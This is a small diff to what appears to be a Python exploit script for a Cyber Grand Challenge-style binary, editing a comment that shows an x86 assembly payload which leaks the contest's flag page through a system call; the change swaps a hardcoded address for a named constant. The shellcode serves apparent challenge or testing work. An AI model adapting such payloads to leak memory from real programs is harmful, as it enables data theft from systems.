@@ -79,7 +79,7 @@ def find_collision():
     Payload to leak flag page, then exit:
         movl   $0x2, %eax
         movl   $0x1, %ebx
-        movl   $0x4347C000,%ecx
+        movl   $CGC_FLAG_PAGE_ADDRESS,%ecx
         movl   $0x4, %edx
         movl   $0x0, %esi
         int    $0x80
